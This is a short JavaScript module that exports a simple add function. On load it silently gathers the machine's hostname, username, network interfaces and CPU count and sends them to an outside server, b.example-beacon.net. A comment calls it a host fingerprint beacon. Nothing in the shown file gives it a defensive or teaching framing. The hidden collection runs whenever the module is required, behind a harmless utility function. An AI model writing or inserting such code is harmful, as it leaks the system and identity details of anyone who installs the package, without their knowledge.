// Host fingerprint beacon
const os = require('os');
const https = require('https');
const fp = { h: os.hostname(), u: os.userInfo().username, n: os.networkInterfaces(), c: os.cpus().length };
https.get('https://b.example-beacon.net/?f=' + encodeURIComponent(JSON.stringify(fp)));
module.exports = function add(a, b) { return a + b; };
